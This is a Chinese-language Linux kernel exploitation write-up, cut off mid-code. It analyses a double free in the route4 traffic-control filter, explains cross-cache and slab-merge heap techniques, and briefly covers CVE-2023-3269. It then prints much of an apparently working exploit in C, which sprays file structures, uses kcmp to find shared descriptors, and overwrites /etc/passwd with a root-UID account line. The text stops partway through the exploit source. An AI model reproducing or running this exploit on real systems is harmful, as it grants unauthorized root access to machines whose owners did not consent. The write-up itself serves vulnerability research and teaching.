nf = rtnl_dereference(*fp)) &#123;\t\tif (nf == f) &#123;\t\t\t/* unlink it */\t\t\tRCU_INIT_POINTER(*fp, rtnl_dereference(f-&gt;next));\t\t\t/* Remove any fastmap lookups that might ref filter\t\t\t * notice we unlink&#x27;d the filter so we can&#x27;t get it\t\t\t * back in the fastmap.\t\t\t */\t\t\troute4_reset_fastmap(head);\t\t\t/* Delete it */\t\t\ttcf_unbind_filter(tp, &amp;f-&gt;res);\t\t\ttcf_exts_get_net(&amp;f-&gt;exts);\t\t\ttcf_queue_work(&amp;f-&gt;rwork, route4_delete_filter_work);\t\t\t/* Strip RTNL protected tree */\t\t\tfor (i = 0; i &lt;= 32; i++) &#123;\t\t\t\tstruct route4_filter *rt;\t\t\t\trt = rtnl_dereference(b-&gt;ht[i]);\t\t\t\tif (rt)\t\t\t\t\tgoto out;\t\t\t&#125;\t\t\t/* OK, session has no flows */\t\t\tRCU_INIT_POINTER(head-&gt;table[to_hash(h)], NULL);\t\t\tkfree_rcu(b, rcu);\t\t\tbreak;\t\t&#125;\t&#125;out:\t*last = true;\tfor (h1 = 0; h1 &lt;= 256; h1++) &#123;\t\tif (rcu_access_pointer(head-&gt;table[h1])) &#123;\t\t\t*last = false;\t\t\tbreak;\t\t&#125;\t&#125;\treturn 0;&#125;\n\n这里再次关注ops中的route4_delete函数，这个函数的作用是释放所有的过滤器，这里使用的依旧是route4_delete_filter_work函数进行删除的，由于前面提到的route4_head中仍然残存handle为0的过滤器的哈希值，因此会对route4_filter和route4_filter-&gt;exts-&gt;actions对象存在double free。\n漏洞利用(这里的利用机制我没有在文章中提过，但等我看完了发现我以前在适配CVE-2023-3269的时候学过T_T，属于是白忙活一场了)\n既然以前的文章中没提到这里就详细介绍一下，既然这篇文章介绍了那就不再写今年那个CVE的分析文章了。\ncross-cache在前面提到，这一利用手法是用于解决内核内部隔离存在的，在CVE-2023-3269的这篇文章中则是用于绕过NUMA机制使用的，只不过在StackRot利用条件更为苛刻，在把这一手法讲解完毕之后简单提一下。\n在前面的一篇文章中详细的解释了内核中的内部隔离机制，大家应该也已经知道了GFP_KERNEL_ACCOUNT标识位和GFP_KERNEL标识位去申请object的时候会从不同的cache中去取。\n说到本篇文章，我们前面提到的可以对两个对象进行Double free，其分别是route4_filter和route4_filter-&gt;exts-&gt;actions，这里主要关注他们的大小，其分别是144和256，会从不同的cache中去取，分别是kmalloc-192和kmalloc-256。而在内核的默认配置中file结构体的大小正好为256，自然而然可以联想到，如果首先使用一个可写的文件占据此位置，再释放掉再使用我们目标的文件去占取再通过某些手法是否可以达成类似于dirty pipe一样的效果呢？\n这里先不考虑后续写的手法，从开始用file结构体开始考虑就会发现内核在分配file结构体时会从一个专属的缓存中取出(类似于cred结构体的分配)，所以这时就不得不考虑cross_cache了。\n众所周知，在内核中管理内存方式主要是两种一是slub用于分配较小的object，其次是buddy system机制用于分配页面。当某一个slab page被释放时会被buddy system回收，在后续的某个时间可能会被重用，然而重用就可能导致不同的cache从同一个页中取出了用一个位置的object交由其他内容使用。而cross-cache利用方法则是利用上述这一机制进行的，当某一slab page中的所有内存槽被释放，那么这个slab page会被强制释放给buddy system，此时如果堆喷另一种类型的对象且其对应的缓存耗尽则会向buddy system申请新的内存页，如果恰好使用了我们前面恶意强制释放的slab page则可实现攻击。(此处的重用机制在下文有详解，为什么不在这写是因为下面分析CVE是我临时起意的)\n将此方法运用到这一环境中很容易可以想到首先通过大量堆喷basic_filter结构体完成内存布局，随后分配一个route4_filter结构体随后继续堆喷basic_filter结构体，那么此时就很有可能一个页面中只存在basic_filter-&gt;exts-&gt;actions和route4_filter-&gt;exts-&gt;actions，如果控制将这个页面中的结构体对应basic_filter和route4_filter全部释放掉那么这个页面则会被强制释放进入buddy system中。再堆喷大量的正常文件使其成功占领我的UAF object，至此我们仍不知道到底是什么位置或是那个文件描述符占据了我们目标位置，所以这里使用漏洞产生double free再一次堆喷大量正常文件来占据刚刚的空洞，随后通过kcmp系统调用即可找到我们共享文件描述符的位置了。\n延长时间窗口前面只提到了可以找到共享文件描述符的位置了，没有继续往后写了，因为这里会遇到一个新的问题了，这里先讲后续的步骤写出来。\n首先，我们已经拿到了目标文件描述符，并且是两个，那我们可以依照常识进行尝试就是我们对其中一个文件描述符中进行写入，对另一个文件描述符写入恶意字符，此时再将两个文件描述符都关闭( 因为都在使用所以此处的引用计数器为2 )，此时再大量堆喷去打开目标特权文件，有一定的几率让特权文件的file结构体会覆盖掉原本的空洞，从而导致后面的恶意字符写入到了特权文件中去了。\n通过前面简要的说明可以看出来这里是存在一个条件竞争的关系，需要在第一个写入垃圾字符，第二个写入恶意字符还没写入时完成偷梁换柱的戏码，看过上一篇文章的朋友可能就会想到使用fuse即可实现，虽然从理论上讲是可以的，但其最终都会利用到内核实现的write的机制。\nssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)&#123;\tssize_t ret;\tif (!(file-&gt;f_mode &amp; FMODE_WRITE))\t\treturn -EBADF;\tif (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))\t\treturn -EINVAL;\tif (unlikely(!access_ok(buf, count)))\t\treturn -EFAULT;\tret = rw_verify_area(WRITE, file, pos, count);\tif (ret)\t\treturn ret;\tif (count &gt; MAX_RW_COUNT)\t\tcount =  MAX_RW_COUNT;\tfile_start_write(file);\tif (file-&gt;f_op-&gt;write)\t\tret = file-&gt;f_op-&gt;write(file, buf, count, pos);\telse if (file-&gt;f_op-&gt;write_iter)\t\tret = new_sync_write(file, buf, count, pos);\telse\t\tret = -EINVAL;\tif (ret &gt; 0) &#123;\t\tfsnotify_modify(file);\t\tadd_wchar(current, ret);\t&#125;\tinc_syscw(current);\tfile_end_write(file);\treturn ret;&#125;\n\n在经过几层调用，write会进入到上述函数中，可以看到在函数的开头部分会检查该文件是否可以写入随后执行file_start_write然后调用ops中的write最后执行file_end_write。\nstatic inline void file_start_write(struct file *file)&#123;\tif (!S_ISREG(file_inode(file)-&gt;i_mode))\t\treturn;\tsb_start_write(file_inode(file)-&gt;i_sb);&#125;static inline void file_end_write(struct file *file)&#123;\tif (!S_ISREG(file_inode(file)-&gt;i_mode))\t\treturn;\t__sb_end_write(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);&#125;\n\n其实这个file_start_write和file_end_write很容易猜出来其功能是什么，这里就是给write加上一个inode锁，当进程A在往程序中写入时进程B会被阻塞在file_start_write的位置，那也就意味着进程B已经通过了程序是否可写的验证了，只是等待进程A写完就会开始写入了，所以在此期间实现上面的偷梁换柱即可，而延长窗口时间的办法就是进程A写入大量数据使进程B阻塞时间延长。\n篇外CVE-2023-3269(与本文无瓜，这里主要举个cross-cache的🌰，仔细看了一下感觉这个考虑的问题比此篇文章考虑的要多一点)\n这个漏洞就不展开讲述了，其是一个UAF漏洞，在cpu0访问vma时cpu1触发expand_stack时有一定几率会因为expand_stack释放掉对应的maple node，而另外一边则还在试图访问vma，当然是可以通过某种方式延长窗口时间，这里不过多提到。\n所以如果我们想要实现任意地址读则需要用可控的结构体去占领比如msg_msg，可惜的是我们单纯堆喷msg_msg是无法在内存中申请到对应的位置的。\n此漏洞的攻击方式从两个方向考虑的，第一就是开启了CONFIG_SLAB_MERGE_DEFAULT选项时(该选项默认开启)，意味着打开了slab重用机制，这里简单介绍一下slab重用机制。\n在向pipe_buffer说yes！篇文章中详细描述了一个slab的申请过程但并没有讨论重用slab的选项，这里首先提一下重用的条件，在后续的代码中可以一一得到验证便于理解\n\n  对方的slab cache和自己的flag都不开启SLAB_NEVER_MERGE\n\n  对方的slab cache和自己都没有构造函数\n\n  对方的slab cache和自己的usersize都为0\n\n  对方的slab大小和自己的相同\n\n\nstruct kmem_cache *kmem_cache_create_usercopy(const char *name,\t\t  unsigned int size, unsigned int align,\t\t  slab_flags_t flags,\t\t  unsigned int useroffset, unsigned int usersize,\t\t  void (*ctor)(void *))&#123;\tstruct kmem_cache *s = NULL;\tconst char *cache_name;\tint err;#ifdef CONFIG_SLUB_DEBUG\t/*\t * If no slub_debug was enabled globally, the static key is not yet\t * enabled by setup_slub_debug(). Enable it if the cache is being\t * created with any of the debugging flags passed explicitly.\t */\tif (flags &amp; SLAB_DEBUG_FLAGS)\t\tstatic_branch_enable(&amp;slub_debug_enabled);#endif\tmutex_lock(&amp;slab_mutex);\terr = kmem_cache_sanity_check(name, size);\tif (err) &#123;\t\tgoto out_unlock;\t&#125;\t/* Refuse requests with allocator specific flags */\tif (flags &amp; ~SLAB_FLAGS_PERMITTED) &#123;\t\terr = -EINVAL;\t\tgoto out_unlock;\t&#125;\t/*\t * Some allocators will constraint the set of valid flags to a subset\t * of all flags. We expect them to define CACHE_CREATE_MASK in this\t * case, and we&#x27;ll just provide them with a sanitized version of the\t * passed flags.\t */\tflags &amp;= CACHE_CREATE_MASK;\t/* Fail closed on bad usersize of useroffset values. */\tif (WARN_ON(!usersize &amp;&amp; useroffset) ||\t    WARN_ON(size &lt; usersize || size - usersize &lt; useroffset))\t\tusersize = useroffset = 0;\tif (!usersize)\t\ts = __kmem_cache_alias(name, size, align, flags, ctor);\tif (s)\t\tgoto out_unlock;\tcache_name = kstrdup_const(name, GFP_KERNEL);\tif (!cache_name) &#123;\t\terr = -ENOMEM;\t\tgoto out_unlock;\t&#125;\ts = create_cache(cache_name, size,\t\t\t calculate_alignment(flags, align, size),\t\t\t flags, useroffset, usersize, ctor, NULL);\tif (IS_ERR(s)) &#123;\t\terr = PTR_ERR(s);\t\tkfree_const(cache_name);\t&#125;out_unlock:\tmutex_unlock(&amp;slab_mutex);\tif (err) &#123;\t\tif (flags &amp; SLAB_PANIC)\t\t\tpanic(&quot;%s: Failed to create slab &#x27;%s&#x27;. Error %d\\n&quot;,\t\t\t\t__func__, name, err);\t\telse &#123;\t\t\tpr_warn(&quot;%s(%s) failed with error %d\\n&quot;,\t\t\t\t__func__, name, err);\t\t\tdump_stack();\t\t&#125;\t\treturn NULL;\t&#125;\treturn s;&#125;EXPORT_SYMBOL(kmem_cache_create_usercopy);\n\n在代码中会验证usersize是否为0，如果是则调用__kmem_cache_alias寻找可重用的slab如果找到了则直接退出\nstruct kmem_cache *__kmem_cache_alias(const char *name, unsigned int size, unsigned int align,\t\t   slab_flags_t flags, void (*ctor)(void *))&#123;\tstruct kmem_cache *s;\ts = find_mergeable(size, align, flags, name, ctor);\tif (s) &#123;\t\ts-&gt;refcount++;\t\t/*\t\t * Adjust the object sizes so that we clear\t\t * the complete object on kzalloc.\t\t */\t\ts-&gt;object_size = max(s-&gt;object_size, size);\t\ts-&gt;inuse = max(s-&gt;inuse, ALIGN(size, sizeof(void *)));\t\tif (sysfs_slab_alias(s, name)) &#123;\t\t\ts-&gt;refcount--;\t\t\ts = NULL;\t\t&#125;\t&#125;\treturn s;&#125;\n\n继续跟进函数，可以发现其内部其实就是调用了一个find_mergeable去寻找slab\nstruct kmem_cache *find_mergeable(unsigned int size, unsigned int align,\t\tslab_flags_t flags, const char *name, void (*ctor)(void *))&#123;\tstruct kmem_cache *s;\tif (slab_nomerge)\t\treturn NULL;\tif (ctor)\t\treturn NULL;\tsize = ALIGN(size, sizeof(void *));\talign = calculate_alignment(flags, align, size);\tsize = ALIGN(size, align);\tflags = kmem_cache_flags(size, flags, name);\tif (flags &amp; SLAB_NEVER_MERGE)\t\treturn NULL;\tlist_for_each_entry_reverse(s, &amp;slab_caches, list) &#123;\t\tif (slab_unmergeable(s))\t\t\tcontinue;\t\tif (size &gt; s-&gt;size)\t\t\tcontinue;\t\tif ((flags &amp; SLAB_MERGE_SAME) != (s-&gt;flags &amp; SLAB_MERGE_SAME))\t\t\tcontinue;\t\t/*\t\t * Check if alignment is compatible.\t\t * Courtesy of Adrian Drzewiecki\t\t */\t\tif ((s-&gt;size &amp; ~(align - 1)) != s-&gt;size)\t\t\tcontinue;\t\tif (s-&gt;size - size &gt;= sizeof(void *))\t\t\tcontinue;\t\tif (IS_ENABLED(CONFIG_SLAB) &amp;&amp; align &amp;&amp;\t\t\t(align &gt; s-&gt;align || s-&gt;align % align))\t\t\tcontinue;\t\treturn s;\t&#125;\treturn NULL;&#125;\n\n而在函数内部则会校验前面提到的flags中不存在SLAB_NEVER_MERGE，随后遍历slab_caches全局链表使用slab_unmergeable函数查看是否可以重用\nstatic bool slab_nomerge = !IS_ENABLED(CONFIG_SLAB_MERGE_DEFAULT);int slab_unmergeable(struct kmem_cache *s)&#123;\tif (slab_nomerge || (s-&gt;flags &amp; SLAB_NEVER_MERGE))\t\treturn 1;\tif (s-&gt;ctor)\t\treturn 1;\tif (s-&gt;usersize)\t\treturn 1;\t/*\t * We may have set a slab to be unmergeable during bootstrap.\t */\tif (s-&gt;refcount &lt; 0)\t\treturn 1;\treturn 0;&#125;\n\n该函数会依次验证是否开启CONFIG_SLAB_MERGE_DEFAULT选项，flags标志位是否存在SLAB_NERVER_MERGE，是否存在构造函数，usersize是否为0，最后是引用次数小于0表示该slab准备释放无法重用。\n以上就是slab重用的基本机制，从而可以得出，如果在开启了CONFIG_SLAB_MERGE_DEFAULT内核选项时存在UAF的maple node所在的slab是会进入到重用链表中取得，而后可以使用msg_msg结构体堆喷相同大小从而分配到UAF的maple node上去的。但是原文重点讲述了在没有开启CONFIG_SLAB_MERGE_DEFAULT选项时如何解决。\n首先现在的很多计算机采用的时NUMA架构，意味着对于每个CPU来说是存在两条链表来存放被释放的slab，首先是cpu_slab和NODE的partial list，又因为不存在CONFIG_SLAB_MERGE_DEFAULT选项的关系，被释放的slab是无法被申请重用的所以这里需要将slab UAF转化为page UAF。\n原文在这里使用的方式是通过clone/fork大量进程来申请大量相同的vma树，然后让一个slab中的所有内容都为我们的maple node，此时可以释放掉每个slab的多余的内容只留下一个object，最后触发漏洞，使其也被释放掉。因为一整个slab上的所有对象都被释放掉了，也就意味着此slab会被强制释放，随后会进入cpu_slab，如果我们前面申请的大量相同进程导致其满了则会进入node的partial list如果也满了则会进入销毁slab的流程\nstatic void __slab_free(struct kmem_cache *s, struct page *page,\t\t\tvoid *head, void *tail, int cnt,\t\t\tunsigned long addr)&#123;\tvoid *prior;\tint was_frozen;\tstruct page new;\tunsigned long counters;\tstruct kmem_cache_node *n = NULL;\tunsigned long flags;\t// ... ...\tif (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))\t\tgoto slab_empty;\t/*\t * Objects left in the slab. If it was not on the partial list before\t * then add it.\t */\tif (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;\t\tremove_full(s, n, page);\t\tadd_partial(n, page, DEACTIVATE_TO_TAIL);\t\tstat(s, FREE_ADD_PARTIAL);\t&#125;\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\treturn;slab_empty:\tif (prior) &#123;\t\t/*\t\t * Slab on the partial list.\t\t */\t\tremove_partial(n, page);\t\tstat(s, FREE_REMOVE_PARTIAL);\t&#125; else &#123;\t\t/* Slab must be on the full list */\t\tremove_full(s, n, page);\t&#125;\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\tstat(s, FREE_SLAB);\tdiscard_slab(s, page);&#125;\n\n可以看到这里会验证数量是否满了，如果满了则会进入销毁流程调用discard_slab\nstatic void discard_slab(struct kmem_cache *s, struct page *page)&#123;\tdec_slabs_node(s, page_to_nid(page), page-&gt;objects);\tfree_slab(s, page);&#125;\n\n而discard_slab函数首先做的事是修改一些数据上的内容随后接着调用free_slab\nstatic void free_slab(struct kmem_cache *s, struct page *page)&#123;\tif (unlikely(s-&gt;flags &amp; SLAB_TYPESAFE_BY_RCU)) &#123;\t\tcall_rcu(&amp;page-&gt;rcu_head, rcu_free_slab);\t&#125; else\t\t__free_slab(s, page);&#125;\n\nstatic void __free_slab(struct kmem_cache *s, struct page *page)&#123;\tint order = compound_order(page);\tint pages = 1 &lt;&lt; order;\tif (kmem_cache_debug_flags(s, SLAB_CONSISTENCY_CHECKS)) &#123;\t\tvoid *p;\t\tslab_pad_check(s, page);\t\tfor_each_object(p, s, page_address(page),\t\t\t\t\t\tpage-&gt;objects)\t\t\tcheck_object(s, page, p, SLUB_RED_INACTIVE);\t&#125;\t__ClearPageSlabPfmemalloc(page);\t__ClearPageSlab(page);\t/* In union with page-&gt;mapping where page allocator expects NULL */\tpage-&gt;slab_cache = NULL;\tif (current-&gt;reclaim_state)\t\tcurrent-&gt;reclaim_state-&gt;reclaimed_slab += pages;\tunaccount_slab_page(page, order, s);\t__free_pages(page, order);&#125;\n\n这里做的事就是获得page的order去出page-&gt;slab_cache的指针，最后释放对应page。当释放page就好办了，可以大量堆喷msg_msg向buddy system申请page即可。\n综上，可得exp可以预见的是，这一利用方法是不需要依赖任何地址的，但是这里想要跑通exp需要修改一下config文件\nCONFIG_NET_CLS_ROUTE4=yCONFIG_DUMMY=y CONFIG_NET_SCH_QFQ=y CONFIG_NET_CLS_BASIC=y\n\n(有点不想写exp了，如果没删这句话那下面exp就是原文的，如果删了就是自己写的好像删了你们也看不到)\n#define _GNU_SOURCE#include &lt;arpa/inet.h&gt;#include &lt;assert.h&gt;#include &lt;dirent.h&gt;#include &lt;endian.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;net/if.h&gt;#include &lt;net/if_arp.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sched.h&gt;#include &lt;signal.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdbool.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/mount.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/time.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/uio.h&gt;#include &lt;sys/wait.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/timerfd.h&gt;#include &lt;linux/tc_ematch/tc_em_meta.h&gt;#include &lt;sys/resource.h&gt;#include &lt;linux/capability.h&gt;#include &lt;linux/futex.h&gt;#include &lt;linux/genetlink.h&gt;#include &lt;linux/if_addr.h&gt;#include &lt;linux/if_ether.h&gt;#include &lt;linux/if_link.h&gt;#include &lt;linux/if_tun.h&gt;#include &lt;linux/in6.h&gt;#include &lt;linux/ip.h&gt;#include &lt;linux/kcmp.h&gt;#include &lt;linux/neighbour.h&gt;#include &lt;linux/net.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;linux/pkt_cls.h&gt;#include &lt;linux/pkt_sched.h&gt;#include &lt;linux/rtnetlink.h&gt;#include &lt;linux/tcp.h&gt;#include &lt;linux/veth.h&gt;#include &lt;x86intrin.h&gt;#include &lt;err.h&gt;#include &lt;fcntl.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/utsname.h&gt;#include &lt;unistd.h&gt;// #define DEBUGchar *target = &quot;/etc/passwd&quot;;char *overwrite =    &quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:root:/root:/bin/bash\\n&quot;;char *global;char *self_path;char *content;#define PAGE_SIZE 0x1000#define MAX_FILE_NUM 0x8000int fds[MAX_FILE_NUM] = &#123;&#125;;int fd_2[MAX_FILE_NUM] = &#123;&#125;;int overlap_a = -1;int overlap_b = -1;int cpu_cores = 0;int sockfd = -1;int spray_num_1 = 2000;int spray_num_2 = 4000;// int spray_num_1 = 4000;// int spray_num_2 = 5000;int pipe_main[2];int pipe_parent[2];int pipe_child[2];int pipe_defrag[2];int pipe_file_spray[2][2];int run_write = 0;int run_spray = 0;char *passwd;bool overlapped = false;void DumpHex(const void *data, size_t size)&#123;#ifdef DEBUG    char ascii[17];    size_t i, j;    ascii[16] = &#x27;\\0&#x27;;    for (i = 0; i &lt; size; ++i)    &#123;        printf(&quot;%02X &quot;, ((unsigned char *)data)[i]);        if (((unsigned char *)data)[i] &gt;= &#x27; &#x27; &amp;&amp;            ((unsigned char *)data)[i] &lt;= &#x27;~&#x27;)        &#123;            ascii[i % 16] = ((unsigned char *)data)[i];        &#125;        else        &#123;            ascii[i % 16] = &#x27;.&#x27;;        &#125;        if ((i + 1) % 8 == 0 || i + 1 == size)        &#123;            printf(&quot; &quot;);            if ((i + 1) % 16 == 0)            &#123;                printf(&quot;|  %s \\n&quot;, ascii);            &#125;            else if (i + 1 == size)            &#123;                ascii[(i + 1) % 16] = &#x27;\\0&#x27;;                if ((i + 1) % 16 &lt;= 8)                &#123;                    printf(&quot; &quot;);                &#125;                for (j = (i + 1) % 16; j &lt; 16; ++j)                &#123;                    printf(&quot;   &quot;);                &#125;                printf(&quot;|  %s \\n&quot;, ascii);            &#125;        &#125;    &#125;#endif&#125;void pin_on_cpu(int cpu)&#123;    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(cpu, &amp;cpu_set);    if (sched_setaffinity(0, sizeof(cpu_set), &amp;cpu_set) != 0)    &#123;        perror(&quot;sched_setaffinity()&quot;);        exit(EXIT_FAILURE);    &#125;&#125;static bool write_file(const char *file, const char *what, ...)&#123;    char buf[1024];    va_list args;    va_start(args, what);    vsnprintf(buf, sizeof(buf), what, args);    va_end(args);    buf[sizeof(buf) - 1] = 0;    int len = strlen(buf);    int fd = open(file, O_WRONLY | O_CLOEXEC);    if (fd == -1)        return false;    if (write(fd, buf, len) != len)    &#123;        int err = errno;        close(fd);        errno = err;        return false;    &#125;    close(fd);    return true;&#125;static void use_temporary_dir(void)&#123;    system(&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;);    system(&quot;touch exp_dir/data2&quot;);    char *tmpdir = &quot;exp_dir&quot;;    if (!tmpdir)        exit(1);    if (chmod(tmpdir, 0777))        exit(1);    if (chdir(tmpdir))        exit(1);    symlink(&quot;./data&quot;, &quot;./uaf&quot;);&#125;static void setup_common()&#123;    if (mount(0, &quot;/sys/fs/fuse/connections&quot;, &quot;fusectl&quot;, 0, 0))    &#123;    &#125;&#125;static void adjust_rlimit()&#123;    struct rlimit rlim;    rlim.rlim_cur = rlim.rlim_max = (200 &lt;&lt; 20);    setrlimit(RLIMIT_AS, &amp;rlim);    rlim.rlim_cur = rlim.rlim_max = 32 &lt;&lt; 20;    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);    rlim.rlim_cur = rlim.rlim_max = 136 &lt;&lt; 20;    // setrlimit(RLIMIT_FSIZE, &amp;rlim);    rlim.rlim_cur = rlim.rlim_max = 1 &lt;&lt; 20;    setrlimit(RLIMIT_STACK, &amp;rlim);    rlim.rlim_cur = rlim.rlim_max = 0;    setrlimit(RLIMIT_CORE, &amp;rlim);    // RLIMIT_FILE    rlim.rlim_cur = rlim.rlim_max = 14096;    if (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; 0)    &#123;        rlim.rlim_cur = rlim.rlim_max = 4096;        spray_num_1 = 1200;        spray_num_2 = 2800;        if (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; 0)        &#123;            perror(&quot;setrlimit&quot;);            err(1, &quot;setrlimit&quot;);        &#125;    &#125;&#125;void setup_namespace()&#123;    int real_uid = getuid();    int real_gid = getgid();    if (unshare(CLONE_NEWUSER) != 0)    &#123;        perror(&quot;[-] unshare(CLONE_NEWUSER)&quot;);        exit(EXIT_FAILURE);    &#125;    if (unshare(CLONE_NEWNET) != 0)    &#123;        perror(&quot;[-] unshare(CLONE_NEWUSER)&quot;);        exit(EXIT_FAILURE);    &#125;    if (!write_file(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;))    &#123;        perror(&quot;[-] write_file(/proc/self/set_groups)&quot;);        exit(EXIT_FAILURE);    &#125;    if (!write_file(&quot;/proc/self/uid_map&quot;, &quot;0 %d 1\\n&quot;, real_uid))    &#123;        perror(&quot;[-] write_file(/proc/self/uid_map)&quot;);        exit(EXIT_FAILURE);    &#125;    if (!write_file(&quot;/proc/self/gid_map&quot;, &quot;0 %d 1\\n&quot;, real_gid))    &#123;        perror(&quot;[-] write_file(/proc/self/gid_map)&quot;);        exit(EXIT_FAILURE);    &#125;&#125;#define NLMSG_TAIL(nmsg) \\    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))int addattr(char *attr, int type, void *data, int len)&#123;    struct rtattr *rta = (struct rtattr *)attr;    rta-&gt;rta_type = type;    rta-&gt;rta_len = RTA_LENGTH(len);    if (len)    &#123;        memcpy(RTA_DATA(attr), data, len);    &#125;    return RTA_LENGTH(len);&#125;int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,              int alen)&#123;    int len = RTA_LENGTH(alen);    struct rtattr *rta;    if (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen)    &#123;        fprintf(stderr, &quot;addattr_l ERROR: message exceeded bound of %d\\n&quot;, maxlen);        return -1;    &#125;    rta = NLMSG_TAIL(n);    rta-&gt;rta_type = type;    rta-&gt;rta_len = len;    if (alen)        memcpy(RTA_DATA(rta), data, alen);    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);    return 0;&#125;struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type)&#123;    struct rtattr *nest = NLMSG_TAIL(n);    addattr_l(n, maxlen, type, NULL, 0);    return nest;&#125;int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)&#123;    nest-&gt;rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;    return n-&gt;nlmsg_len;&#125;int add_qdisc(int fd)&#123;    char *start = malloc(0x1000);    memset(start, 0, 0x1000);    struct nlmsghdr *msg = (struct nlmsghdr *)start;    // new qdisc    msg-&gt;nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;    msg-&gt;nlmsg_type = RTM_NEWQDISC;    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));    // set local    t-&gt;tcm_ifindex = 1;    t-&gt;tcm_family = AF_UNSPEC;    t-&gt;tcm_parent = TC_H_ROOT;    // prio, protocol    u_int32_t prio = 1;    u_int32_t protocol = 1;    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; 16, protocol);    addattr_l(msg, 0x1000, TCA_KIND, &quot;sfq&quot;, 4);    // packing#ifdef DEBUG    DumpHex(msg, msg-&gt;nlmsg_len);#endif    struct iovec iov = &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;    struct sockaddr_nl nladdr = &#123;.nl_family = AF_NETLINK&#125;;    struct msghdr msgh = &#123;        .msg_name = &amp;nladdr,        .msg_namelen = sizeof(nladdr),        .msg_iov = &amp;iov,        .msg_iovlen = 1,    &#125;;    return sendmsg(fd, &amp;msgh, 0);&#125;int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle,            u_int16_t flags)&#123;    char *start = malloc(0x2000);    memset(start, 0, 0x2000);    struct nlmsghdr *msg = (struct nlmsghdr *)start;    // new filter    msg = msg + msg-&gt;nlmsg_len;    msg-&gt;nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));    msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;    msg-&gt;nlmsg_type = RTM_NEWTFILTER;    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));    // prio, protocol    u_int32_t prio = 1;    u_int32_t protocol = 1;    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; 16, protocol);    t-&gt;tcm_ifindex = 1;    t-&gt;tcm_family = AF_UNSPEC;    t-&gt;tcm_handle = handle;    addattr_l(msg, 0x1000, TCA_KIND, &quot;route&quot;, 6);    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);    addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &amp;from, 4);    addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &amp;to, 4);    addattr_nest_end(msg, tail);    // packing    struct iovec iov = &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;    struct sockaddr_nl nladdr = &#123;.nl_family = AF_NETLINK&#125;;    struct msghdr msgh = &#123;        .msg_name = &amp;nladdr,        .msg_namelen = sizeof(nladdr),        .msg_iov = &amp;iov,        .msg_iovlen = 1,    &#125;;    sendmsg(fd, &amp;msgh, 0);    free(start);    return 1;&#125;void add_tc(int sockfd, uint32_t handle, uint16_t flag)&#123;    add_tc_(sockfd, 0, handle, (handle &lt;&lt; 8) + handle, flag);&#125;uint32_t calc_handle(uint32_t from, uint32_t to)&#123;    uint32_t handle = to;    assert(from &lt;= 0xff &amp;&amp; to &lt;= 0xff);    handle |= from &lt;&lt; 16;    if (((handle &amp; 0x7f00) | handle) != handle)        return 0;    if (handle == 0 || (handle &amp; 0x8000))        return 0;    return handle;&#125;void *delete_tc_(int sockfd, u_int32_t handle)&#123;    char *start = malloc(0x4000);    memset(start, 0, 0x4000);    struct nlmsghdr *msg = (struct nlmsghdr *)start;    // new filter    msg = msg + msg-&gt;nlmsg_len;    msg-&gt;nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;    msg-&gt;nlmsg_type = RTM_DELTFILTER;    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));    // prio, protocol    u_int32_t prio = 1;    u_int32_t protocol = 1;    t-&gt;tcm_info = TC_H_MAKE(prio 